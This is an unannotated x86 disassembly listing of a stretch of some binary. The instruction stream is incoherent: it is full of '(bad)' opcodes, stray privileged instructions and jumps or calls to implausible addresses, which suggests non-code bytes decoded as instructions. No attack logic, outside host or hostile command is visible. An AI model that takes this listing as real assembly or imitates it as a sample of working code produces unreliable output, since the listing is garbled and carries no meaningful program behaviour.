  431b0c:	retf   0x6c7
  431b0f:	iret   
  431b10:	dec    ebp
  431b11:	inc    ebp
  431b12:	mov    DWORD PTR [ebx],edi
  431b14:	fmul   QWORD PTR [edi]
  431b16:	dec    ebp
  431b17:	jnp    0x431b4c
  431b19:	add    BYTE PTR [ebx],al
  431b1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431b1e:	inc    ebp
  431b1f:	dec    ebp
  431b20:	lea    esi,[ebx]
  431b22:	add    DWORD PTR [ebx],eax
  431b24:	jb     0x431b61
  431b26:	add    BYTE PTR [edi],cl
  431b28:	inc    ebp
  431b29:	imul   eax,edi,0x858bd800
  431b2f:	cld    
  431b30:	clc    
  431b31:	mov    DWORD PTR [ebp+0x0],eax
  431b34:	inc    DWORD PTR [eax]
  431b36:	or     al,0xde
  431b38:	sbb    bh,0x1
  431b3b:	retf   
  431b3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431b43:	dec    ebp
  431b44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431b4a:	enter  0x12de,0xdf
  431b4e:	inc    ebp
  431b4f:	pop    ebp
  431b50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431b56:	add    DWORD PTR [edx],edx
  431b58:	add    BYTE PTR [ebp+0x50],dl
  431b5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431b61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431b67:	or     ah,al
  431b69:	pop    ss
  431b6a:	cdq    
  431b6b:	push   ebp
  431b6c:	clc    
  431b6d:	mov    eax,DWORD PTR [ebp-0x4]
  431b70:	xor    edx,edx
  431b72:	add    esi,DWORD PTR [ebx]
  431b74:	cmp    eax,DWORD PTR [ebx]
  431b76:	hlt    
  431b77:	cmp    DWORD PTR [ebx],esp
  431b79:	or     al,BYTE PTR [ebp+0xf]
  431b7c:	mov    eax,DWORD PTR [edx]
  431b7e:	loopne 0x431b80
  431b80:	(bad)  
  431b81:	mov    ecx,esi
  431b83:	cld    
  431b84:	pushf  
  431b85:	pop    ebp
  431b86:	fwait
  431b87:	mov    esi,DWORD PTR [edx]
  431b89:	lock mov eax,eax
  431b8c:	adc    BYTE PTR [ebx],al
  431b8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431b95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431b9b:	dec    ebp
  431b9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ba2:	(bad)  
  431ba3:	iret   
  431ba4:	inc    ebp
  431ba5:	(bad)  
  431ba6:	jne    0x431bf5
  431ba8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431bae:	(bad)  
  431baf:	cmp    ebx,eax
  431bb1:	je     0x431b39
  431bb3:	add    edi,edi
  431bb5:	or     bh,bh
  431bb7:	dec    ebp
  431bb8:	inc    ebp
  431bb9:	mov    esi,DWORD PTR [ebx]
  431bbb:	cld    
  431bbc:	add    ecx,esi
  431bbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431bc1:	mov    edx,DWORD PTR [edi]
  431bc3:	or     BYTE PTR [ebp-0x7c],al
  431bc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431bcc:	test   BYTE PTR [ebx+ebx*4],cl
  431bcf:	inc    ebp
  431bd0:	xor    bh,BYTE PTR [esi]
  431bd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431bd9:	jne    0x431ba2
  431bdb:	mov    ebp,esp
  431bdd:	fcomp  DWORD PTR [ebx]
  431bdf:	add    BYTE PTR [ecx],al
  431be1:	inc    DWORD PTR [ebp-0x75]
  431be4:	(bad)  
  431be5:	cld    
  431be6:	add    al,0xce
  431be8:	mov    ecx,edi
  431bea:	cld    
  431beb:	inc    ebp
  431bec:	fidivr WORD PTR [ebx]
  431bee:	fbstp  TBYTE PTR [ebp-0x3e]
  431bf1:	mov    eax,DWORD PTR [eax]
  431bf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431bf9:	fadd   st,st(7)
  431bfb:	add    BYTE PTR [ebp-0x1],al
  431bfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431c01:	inc    ebp
  431c02:	mov    bh,0xc7
  431c05:	loopne 0x431c4c
  431c07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431c0d:	sbb    dh,BYTE PTR [ebx]
  431c0f:	pushf  
  431c10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431c16:	mov    eax,edi
  431c18:	cwde   
  431c19:	inc    ebp
  431c1a:	inc    ebp
  431c1b:	jne    0x431ba8
  431c1d:	mov    esp,esp
  431c1f:	clc    
  431c20:	add    al,0x4d
  431c22:	mov    DWORD PTR [ebx],esi
  431c24:	or     al,0x33
  431c26:	inc    ebp
  431c27:	lea    ecx,[ebx-0x398d13fd]
  431c2d:	add    bh,al
  431c2f:	inc    ebp
  431c30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431c37:	add    ebp,esp
  431c39:	shufps xmm1,xmm3,0xc7
  431c3d:	(bad)  
  431c3e:	jmp    0x74885767
  431c43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431c49:	hlt    
  431c4a:	mov    ecx,DWORD PTR [edi]
  431c4c:	fadd   DWORD PTR [ebp+0x0]
  431c4f:	xor    ecx,DWORD PTR [edi]
  431c51:	add    ecx,ecx
  431c53:	cmp    edi,edi
  431c55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431c59:	(bad)  
  431c5a:	jmp    0x431be7
  431c5c:	mov    edi,esp
  431c5e:	or     al,0xc6
  431c60:	inc    ebp
  431c61:	(bad)  
  431c62:	mov    eax,DWORD PTR [ebp+0x10]
  431c65:	jne    0x431bf0
  431c67:	mov    eax,DWORD PTR [ecx]
  431c69:	clc    
  431c6a:	add    BYTE PTR [ebp-0x40],cl
  431c6d:	xor    edx,DWORD PTR [eax-0x73]
  431c70:	jne    0x431c73
  431c72:	push   DWORD PTR [edx+0x8]
  431c75:	add    BYTE PTR [ebp+0x45],al
  431c78:	mov    ebp,ecx
  431c7a:	cld    
  431c7b:	add    BYTE PTR [ebp+0x0],cl
  431c7e:	xor    eax,DWORD PTR [ebp+0x3]
  431c81:	mov    DWORD PTR [ebx],edi
  431c83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431c89:	sub    eax,0x5d330e4d
  431c8e:	lea    esi,[ebx]
  431c90:	add    DWORD PTR [ebx],eax
  431c92:	jb     0x431c7d
  431c94:	add    BYTE PTR [eax],al
  431c96:	inc    ebp
  431c97:	add    bl,ch
  431c99:	inc    ebp
  431c9a:	mov    esi,DWORD PTR [ebx]
  431c9c:	or     al,0x3
  431c9e:	(bad)  
  431c9f:	mov    edi,eax
  431ca1:	in     al,dx
  431ca2:	scas   eax,DWORD PTR es:[edi]
  431ca3:	inc    ebp
  431ca4:	mov    esi,DWORD PTR [ebx]
  431ca6:	in     al,0x3
  431ca8:	add    al,0x89
  431caa:	mov    ecx,DWORD PTR [eax+edi*8]
  431cad:	dec    ebp
  431cae:	(bad)  
  431caf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431cb6:	mov    ecx,eax
  431cb8:	cld    
  431cb9:	push   es
  431cba:	dec    ebp
  431cbb:	add    al,0x33
  431cbd:	mov    DWORD PTR [ebx],eax
  431cbf:	in     al,dx
  431cc0:	cmp    DWORD PTR [ebp-0x67],eax
  431cc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431cc9:	mov    edx,DWORD PTR [ebp-0x4]
  431ccc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431ccf:	xor    eax,DWORD PTR [ebp+0x3]
  431cd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431cd8:	xor    edi,esp
  431cda:	jmp    0xff771a2c
  431cdf:	add    ecx,DWORD PTR [ebp-0x3f]
  431ce2:	xor    ebx,DWORD PTR [edi]
  431ce4:	add    eax,ecx
  431ce6:	cmp    ebx,DWORD PTR [eax]
  431ce8:	mov    ecx,DWORD PTR [ebp-0x4]
  431ceb:	mov    ecx,DWORD PTR [eax]
  431ced:	adc    BYTE PTR [ebp-0x80],al
  431cf0:	jmp    0x431cf3
  431cf2:	mov    eax,DWORD PTR [eax]
  431cf4:	cld    
  431cf5:	mov    bh,0xc6
  431cf7:	push   ecx
  431cf8:	(bad)  
  431cf9:	jne    0x431d59
  431cfb:	dec    ecx
  431cfd:	or     BYTE PTR [ecx+ebx*1],cl
  431d00:	push   ebp
  431d01:	inc    ebp
  431d02:	in     al,dx
  431d03:	add    ebp,esp
  431d05:	or     bh,al
  431d07:	dec    ebp
  431d08:	cld    
  431d09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431d0f:	xor    DWORD PTR [edx],0x2
  431d12:	pushf  
  431d13:	dec    DWORD PTR [ebx+0x45510cf4]
  431d19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431d1f:	mov    edx,DWORD PTR [ecx+0xc]
  431d22:	xor    eax,esi
  431d24:	mov    edx,0xc172c7
  431d29:	inc    ebp
  431d2a:	mov    esi,DWORD PTR [ebp+0x8]
  431d2d:	mov    eax,edx
  431d2f:	call   0x84c7e424
  431d34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431d3a:	mov    ebp,eax
  431d3c:	or     BYTE PTR [eax],dl
  431d3e:	jo     0x431d8d
  431d40:	push   edi
  431d41:	xor    esi,DWORD PTR [ebp+0x3]
  431d44:	(bad)  
  431d45:	pmulhuw mm0,mm1
  431d48:	test   DWORD PTR [ebp-0x8],ecx
  431d4b:	mov    DWORD PTR [ebp-0x67],eax
  431d4e:	mov    eax,DWORD PTR [ebp-0x4]
  431d51:	xor    edi,DWORD PTR [ebp-0x73]
  431d54:	xor    eax,DWORD PTR [ebx]
  431d56:	xor    esi,DWORD PTR [edx+0x3]
  431d59:	add    BYTE PTR [ecx],bh
  431d5b:	inc    ebp
  431d5c:	(bad)  
  431d5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431d63:	mov    DWORD PTR [eax],0x750f0004
  431d69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431d6f:	lock add BYTE PTR [ebp+0x0],cl
  431d73:	mov    esi,DWORD PTR [ebp-0x18]
  431d76:	mov    ebp,edx
  431d78:	or     al,0x72
  431d7a:	ja     0x431d7c
  431d7c:	mov    edx,esi
  431d7e:	cld    
  431d7f:	(bad)  
  431d82:	cli    
  431d83:	mov    esi,DWORD PTR [ebp-0x4]
  431d86:	cmp    ecx,esi
  431d88:	bswap  edi
  431d8a:	(bad)
  431d8e:	mov    esi,DWORD PTR [ebp-0x4]
  431d91:	mov    esi,ecx
  431d93:	clc    
  431d94:	repnz add esi,DWORD PTR [ebp+0x45]
  431d98:	push   ebx
  431d99:	xor    eax,DWORD PTR [ebp+0x3]
  431d9c:	cmp    al,0x5f
  431d9e:	pushf  
  431d9f:	pop    ebx
  431da0:	jmp    0x431e67
  431da5:	mov    esi,DWORD PTR [ebp-0x7d]
  431da8:	xor    ebp,DWORD PTR [eax]
  431daa:	lea    eax,[ebp-0x8]
  431dad:	xor    edx,esi
  431daf:	pushf  
  431db0:	out    dx,eax
  431db1:	(bad)  
  431db2:	neg    eax
  431db4:	ins    DWORD PTR es:[edi],dx
  431db5:	test   esi,edi
  431db7:	clc    
  431db8:	pop    esp
  431db9:	inc    ebp
  431dba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431dc0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431dc6:	add    cl,al
  431dc8:	jne    0x431d65
  431dca:	mov    esi,DWORD PTR [edx]
  431dcc:	in     al,dx
  431dcd:	push   esi
  431dce:	xor    BYTE PTR [ebp-0xe],dh
  431dd1:	add    edi,esi
  431dd3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431dd9:	add    cl,bh
  431ddb:	mov    edi,DWORD PTR [ebp+0x8]
  431dde:	mov    DWORD PTR [ebp-0x14],esi
  431de1:	add    esi,DWORD PTR [ebp+0x3c]
  431de4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431dea:	mov    ah,0x3e
  431dec:	fwait
  431ded:	pushf  
  431dee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431df4:	jne    0x431d81
  431df6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431df9:	icebp  
  431dfa:	icebp  
  431dfb:	shl    edx,0xf2
  431dfe:	(bad)  
  431dff:	mov    ah,0x16
  431e01:	push   eax
  431e02:	jne    0x431d97
  431e04:	mov    ecx,DWORD PTR [edi]
  431e06:	in     al,dx
  431e07:	jmp    0x431dfa
  431e09:	add    dl,dh
  431e0b:	mov    edi,esi
  431e0d:	or     al,0x8
  431e0f:	inc    ebp
  431e10:	jne    0x431e15
  431e12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431e18:	ret    
  431e19:	or     bh,bh
  431e1b:	jge    0x431e05
  431e1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431e23:	xor    edi,eax
  431e25:	add    esi,DWORD PTR [ebp-0x77]
  431e28:	mov    ebx,esp
  431e2a:	clc    
  431e2b:	neg    DWORD PTR [ebp-0x7c]
  431e2e:	xor    eax,DWORD PTR [eax]
  431e30:	cmp    eax,DWORD PTR [eax]
  431e32:	repz jne 0x431dca
  431e35:	xor    eax,DWORD PTR [ecx]
  431e37:	add    ebx,DWORD PTR [eax]
  431e39:	mov    DWORD PTR [ebp-0x8],eax
  431e3c:	mov    eax,edi
  431e3e:	cld    
  431e3f:	lock pop eax
  431e41:	test   DWORD PTR [ebx],esi
  431e43:	clc    
  431e44:	add    edx,DWORD PTR [edi-0x740bff77]
  431e4a:	fdivp  st(4),st
  431e4c:	test   ecx,esi
  431e4e:	(bad)  
  431e4f:	jnp    0x431e50
  431e51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431e57:	jae    0x431de4
  431e59:	sub    edi,esp
  431e5b:	(bad)  
  431e5c:	shl    DWORD PTR [eax-0x3e],0x89
  431e60:	leave  
  431e61:	call   0x8198d56e
  431e66:	in     al,dx
  431e67:	(bad)  
  431e68:	in     al,dx
  431e69:	add    bh,al
  431e6b:	mov    esp,edi
  431e6d:	in     al,dx
  431e6e:	test   DWORD PTR [ebp-0x8],edi
  431e71:	mov    eax,DWORD PTR [ebp+0x2b]
  431e74:	xor    al,BYTE PTR [ebx]
  431e76:	pushf  
  431e77:	jnp    0x57321ab0
  431e7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431e81:	loopne 0x431eb6
  431e83:	jne    0x431e40
  431e85:	mov    esi,DWORD PTR [edx-0x20]
  431e88:	add    BYTE PTR [ebp-0x3d],bh
  431e8b:	xor    eax,DWORD PTR [ebp-0x73]
  431e8e:	mov    edi,DWORD PTR [esi]
  431e90:	cld    
  431e91:	jb     0x431e59
  431e93:	add    bl,al
  431e95:	jne    0x431edc
  431e97:	mov    edx,DWORD PTR [edi-0x10]
  431e9a:	jge    0x431f19
  431e9c:	mov    esi,DWORD PTR [ebx]
  431e9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431ea2:	xor    esi,DWORD PTR [ebp-0x77]
  431ea5:	mov    esi,eax
  431ea7:	lock inc ebp
  431ea9:	jge    0x431edc
  431eab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431eb2:	dec    ebp
  431eb3:	mov    esi,DWORD PTR [ebx]
  431eb5:	loopne 0x431e40
  431eb7:	jge    0x431eb1
  431eb9:	add    DWORD PTR [ebp-0x7d],eax
  431ebc:	icebp  
  431ebd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431ec4:	dec    ebp
  431ec5:	hlt    
  431ec6:	xor    ebx,DWORD PTR [ebp-0x77]
  431ec9:	mov    esi,esp
  431ecb:	in     al,0x45
  431ecd:	jge    0x431f0c
  431ecf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431ed6:	dec    ebp
  431ed7:	push   esp
  431ed8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431ede:	inc    ebp
  431edf:	hlt    
  431ee0:	xor    DWORD PTR [ebp-0x61],esi
  431ee3:	mov    edi,DWORD PTR [eax+0xf19504]
  431ee9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431eed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ef0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ef4:	fistp  WORD PTR [ebx+0x0]
  431ef7:	inc    ebp
  431ef8:	mov    ebx,DWORD PTR [edi+0xc]
  431efb:	add    eax,eax
  431efd:	inc    ebp
  431efe:	test   BYTE PTR [ebx],dh
  431f00:	add    eax,DWORD PTR [ebx]
  431f02:	add    BYTE PTR [esi+0x45],bl
  431f05:	ret    0x85
  431f08:	jnp    0x5443a2d7
  431f0e:	inc    bp
  431f10:	inc    ebp
  431f11:	xor    DWORD PTR [ecx+0xc78a9c],edi
  431f17:	fdiv   QWORD PTR [ebx]
  431f19:	test   DWORD PTR [ecx+0x453bf8],edi
  431f1f:	push   ebx
  431f20:	add    edi,DWORD PTR [esi+0x708088b]
  431f26:	cmp    esi,eax
  431f28:	setnp  BYTE PTR [ecx-0x74fcffce]
  431f2f:	mov    esp,edi
  431f31:	call   0x33ce6483
  431f36:	or     BYTE PTR [ebx],al
  431f38:	inc    ecx
  431f39:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431f3f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431f45:	lock add cl,al
  431f48:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431f4f:	mov    ch,0x45
  431f51:	clc    
  431f52:	xor    eax,DWORD PTR [ebp+0x3]
  431f55:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431f5b:	inc    ebp
  431f5c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431f62:	mov    edi,eax
  431f64:	mov    eax,DWORD PTR [ebp+0x3c]
  431f67:	mov    ecx,DWORD PTR [eax]
  431f69:	hlt    
  431f6a:	inc    ebp
  431f6b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431f72:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431f78:	push   ebp
  431f79:	mov    edi,DWORD PTR [ebx]
  431f7b:	in     al,dx
  431f7c:	jne    0x431f3f
  431f7e:	mov    eax,DWORD PTR [ebp-0x28]
  431f81:	add    DWORD PTR [eax],0xe8058dec
  431f87:	clc    
  431f88:	mov    esi,DWORD PTR [edi-0x8]
  431f8b:	add    dh,dl
  431f8d:	rol    WORD PTR [ebp-0x1],cl
  431f91:	mov    edx,DWORD PTR [eax+0x8]
  431f94:	jne    0x431f56
  431f96:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431f9d:	inc    ebp
  431f9e:	push   esp
  431f9f:	test   DWORD PTR [ecx+0xf],ecx
  431fa2:	sub    edx,esp
  431fa4:	add    eax,DWORD PTR [eax]
  431fa6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431fac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431fb3:	mov    eax,DWORD PTR [ecx]
  431fb5:	and    BYTE PTR [eax],al
  431fb7:	cmp    al,0x10
  431fb9:	add    BYTE PTR [ebp+0x66],al
  431fbc:	inc    ecx
  431fbe:	push   esp
  431fbf:	add    dh,BYTE PTR [ebp+0x0]
  431fc2:	push   edx
  431fc3:	enterw 0xc1,0x4d
  431fc8:	mov    esp,DWORD PTR [esi+0x20]
  431fcb:	add    DWORD PTR [ecx-0x7b],eax
  431fce:	add    eax,DWORD PTR [ebx]
  431fd0:	str    WORD PTR [eax+0x45]
  431fd4:	lea    ecx,[ebx+0x45890801]
  431fda:	sbb    BYTE PTR [ebx],al
  431fdc:	dec    ebp
  431fdd:	cmp    al,0xf
  431fdf:	inc    ebp
  431fe0:	push   eax
  431fe1:	mov    esi,DWORD PTR [ebx]
  431fe3:	push   eax
  431fe4:	add    eax,eax
  431fe6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431fed:	inc    ebp
  431fee:	add    BYTE PTR [ecx],dh
  431ff0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  431ff7:	(bad)  
  431ff8:	mov    ebx,eax
  431ffa:	loopne 0x432041
  431ffc:	dec    ebp
  431ffd:	mov    ecx,DWORD PTR [edi]
  431fff:	cld    
  432000:	push   eax
  432001:	xchg   DWORD PTR [ebx],esi
  432003:	add    DWORD PTR [ebx],ebp
  432005:	add    BYTE PTR [ebx],ch
  432007:	or     BYTE PTR [ecx],bh
  432009:	dec    ecx
  43200a:	loopne 0x43200f
  43200c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432012:	push   ebp
  432013:	add    DWORD PTR [ebx+0x55100800],eax
  432019:	dec    ebp
  43201a:	jmp    0x431fa5
  43201c:	mov    esp,DWORD PTR [eax]
  43201e:	sbb    dl,dl
  432020:	inc    eax
  432021:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432027:	add    BYTE PTR [ebx+0x74528555],cl
  43202d:	push   ebp
  43202e:	div    DWORD PTR [ebx]
  432030:	and    eax,DWORD PTR [ebx]
  432032:	add    edx,DWORD PTR [edx-0x30]
  432035:	jno    0x431fc2
  432037:	inc    DWORD PTR [eax+eiz*1]
  43203a:	inc    ebp
  43203b:	push   eax
  43203c:	push   eax
  43203d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432043:	mov    edi,esp
  432045:	push   eax
  432046:	inc    ebp
  432047:	enter  0x458b,0x8
  43204b:	push   ecx
  43204c:	(bad)  
  43204d:	call   0x10d2a25
  432052:	pop    ss
  432053:	push   ebp
  432054:	mov    ecx,DWORD PTR [ebx+0x489408]
  43205a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432060:	push   ecx
  432061:	jo     0x43204b
  432063:	inc    DWORD PTR [edi]
  432065:	or     BYTE PTR [eax],al
  432067:	call   0xce27b1
  43206c:	fmul   QWORD PTR [ebp+0x55]
  43206f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432075:	mov    bh,0x8c
  432077:	adc    al,0x9b
  432079:	dec    esp
  43207a:	xor    bl,BYTE PTR [eax]
  43207c:	mov    ecx,DWORD PTR [ebp+0xc]
  43207f:	mov    eax,DWORD PTR [ebp-0x4]
  432082:	mov    esi,DWORD PTR [edi-0x3148f924]
  432088:	push   es
  432089:	retf   
  43208a:	mov    BYTE PTR [ebp-0x30],0x3b
  43208e:	inc    ebp
  43208f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432096:	retf   0x83fc
  432099:	into   
  43209a:	dec    ebp
  43209b:	retf   
  43209c:	mov    ecx,DWORD PTR [ebp-0x74]
  43209f:	mov    eax,DWORD PTR [eax]
  4320a1:	fdiv   QWORD PTR [ebx]
  4320a3:	mov    bh,0x3
  4320a5:	push   es
  4320a6:	mov    esi,ecx
  4320a8:	sbb    cl,dl
  4320aa:	dec    ebp
  4320ab:	sar    DWORD PTR [ebx],cl
  4320ad:	push   ebp
  4320ae:	jne    0x4320bf
  4320b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4320b6:	lea    ebx,[eax]
  4320b8:	call   0xf4ccac7f
  4320bd:	sbb    dh,dl
  4320bf:	add    edx,ebx
  4320c1:	push   ebp
  4320c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4320c8:	push   ecx
  4320c9:	mov    DWORD PTR [eax-0x30],edx
  4320cc:	test   DWORD PTR [edx],eax
  4320ce:	xadd   esp,esi
  4320d1:	pop    es
  4320d2:	add    cl,dl
  4320d4:	mov    eax,ecx
  4320d6:	or     al,0x45
  4320d8:	(bad)  
  4320d9:	push   eax
  4320da:	add    DWORD PTR [edx+0x0],eax
  4320dd:	add    ecx,DWORD PTR [ecx]
  4320df:	and    dh,cl
  4320e1:	call   0xc729b1
  4320e6:	add    DWORD PTR [ebp+0x0],edx
  4320e9:	mov    esp,DWORD PTR [ebp+0x18]
  4320ec:	add    BYTE PTR [eax+0x50],cl
  4320ef:	xor    eax,DWORD PTR [eax]
  4320f1:	add    esp,DWORD PTR [esi+0x3b]
  4320f4:	inc    ebp
  4320f5:	je     0x43207a
  4320f7:	push   ecx
  4320f8:	dec    BYTE PTR [ebp-0x77]
  4320fb:	add    eax,esi
  4320fd:	or     al,0x5e
  4320ff:	inc    eax
  432100:	add    BYTE PTR [ebx],al
  432102:	data16 and BYTE PTR [ebp+0x50],al
  432106:	sub    DWORD PTR [ecx],0xfffffff8
  432109:	add    BYTE PTR [ebp-0x75],ah
  43210c:	add    BYTE PTR [eax],bl
  43210e:	enter  0x894d,0x8b
  432112:	int3   
  432113:	loopne 0x4320d7
  432115:	rol    BYTE PTR [eax],0x33
  432118:	lea    cx,[ebp+0xa]
  43211c:	data16 jb 0x432164
  43211f:	add    BYTE PTR [ebx+0x44890855],cl
  432125:	sbb    ah,al
  432127:	inc    ebp
  432128:	cmp    al,0xf
  43212a:	add    BYTE PTR [edx+0x66],dl
  43212d:	xor    ecx,DWORD PTR [eax]
  43212f:	sub    eax,DWORD PTR [edx]
  432131:	mov    eax,DWORD PTR [eax]
  432133:	or     al,0x66
  432135:	ror    edx,cl
  432137:	dec    ebp
  432138:	inc    ebp
  432139:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43213f:	cld    
  432140:	or     BYTE PTR [edi+0x4501dd],dl
  432146:	ret    0xecce
  432149:	retf   
  43214a:	(bad)  
  43214b:	dec    ebp
  43214c:	mov    al,0x8b
  43214e:	loopne 0x432170
  432150:	cmp    ecx,DWORD PTR [edx]
  432152:	inc    ebp
  432153:	daa    
  432154:	loopne 0x4320dd
  432156:	in     al,dx
  432157:	add    edi,eax
  432159:	add    BYTE PTR [eax+0x3f52e155],bh
  43215f:	push   ebp
  432160:	inc    ebp
  432161:	xor    ebx,edx
  432163:	add    ebp,esp
  432165:	push   edx
  432166:	push   bp
  432168:	inc    ebp
  432169:	(bad)  
  43216a:	in     eax,dx
  43216b:	push   esp
  43216c:	(bad)  
  43216d:	inc    edx
  43216f:	sbb    al,0x33
  432171:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432178:	add    BYTE PTR [ebp+0x46],0x8b
  43217c:	jmp    0xf98b:0x100041c8
  432183:	xor    esi,DWORD PTR [edx+0x3]
  432186:	mov    ecx,DWORD PTR [edi]
  432188:	fmul   DWORD PTR [edx]
  43218a:	add    BYTE PTR [eax],al
  43218c:	lea    eax,[ebx-0x4700273c]
  432192:	add    al,0x4f
  432194:	pop    DWORD PTR [eax]
  432196:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43219c:	push   edx
  43219d:	inc    WORD PTR [ebp+0x8]
  4321a1:	mov    eax,0x514f4d
  4321a6:	(bad)
  4321aa:	add    al,al
  4321ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4321b2:	test   DWORD PTR [esi+0x74],esp
  4321b5:	inc    ebp
  4321b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4321bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4321c2:	or     dh,cl
  4321c4:	or     eax,0x8b8d5045
  4321c9:	inc    ebp
  4321ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4321d0:	jne    0x432205
  4321d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4321d8:	add    DWORD PTR [ebx],eax
  4321da:	add    bh,bh
  4321dc:	adc    DWORD PTR [eax],ecx
  4321de:	adc    DWORD PTR [ebp+0x55],edi
  4321e1:	push   es
  4321e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4321e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4321ef:	inc    ebp
  4321f0:	mov    esp,edi
  4321f2:	or     al,0xda
  4321f4:	push   eax
  4321f5:	(bad)  
  4321f6:	jne    0x4321ac
  4321f8:	call   0x3b1ae7
  4321fd:	inc    ebp
  4321fe:	sar    BYTE PTR [eax],0x84
  432201:	in     al,dx
  432202:	add    bh,al
  432204:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43220b:	(bad)  
  43220c:	and    al,al
  43220e:	fs in  eax,dx
  432210:	inc    DWORD PTR [ebp-0x7b]
  432213:	jle    0x432224
  432215:	leave  
  432216:	scas   al,BYTE PTR es:[edi]
  432217:	inc    esp
  432218:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43221f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432226:	call   DWORD PTR [edi]
  432228:	shr    ah,0x84
  43222b:	xchg   DWORD PTR [eax],eax
  43222d:	add    DWORD PTR [eax],eax
  43222f:	add    bh,bh
  432231:	dec    ebp
  432232:	and    BYTE PTR [ecx-0x38],dl
  432235:	push   eax
  432236:	dec    DWORD PTR [ebx+0xfd885]
  43223c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432242:	mov    WORD PTR [ecx+0x0],ss
  432245:	lea    ecx,[ebx+0x108b20d8]
  43224b:	mov    WORD PTR [edx],ds
  43224d:	add    BYTE PTR [edi+0xff01ff],al
  432253:	mov    ecx,DWORD PTR [ebp-0x28]
  432256:	push   ecx
  432257:	shl    BYTE PTR [ebp+0x3a],0x8b
  43225b:	inc    ebp
  43225c:	in     al,0xeb
  43225e:	jno    0x4321eb
  432260:	push   edx
  432261:	mov    DWORD PTR [eax-0x28],edx
  432264:	mov    eax,DWORD PTR [ebp+0x20]
  432267:	je     0x4321f0
  432269:	mov    eax,DWORD PTR [ecx]
  43226b:	sbb    BYTE PTR [eax],al
  43226d:	pop    DWORD PTR [eax]
  43226f:	add    esi,eax
  432271:	add    bl,al
  432273:	adc    DWORD PTR [edi],esi
  432275:	jmp    0x8bce72c7
  43227a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432281:	jne    0x43220e
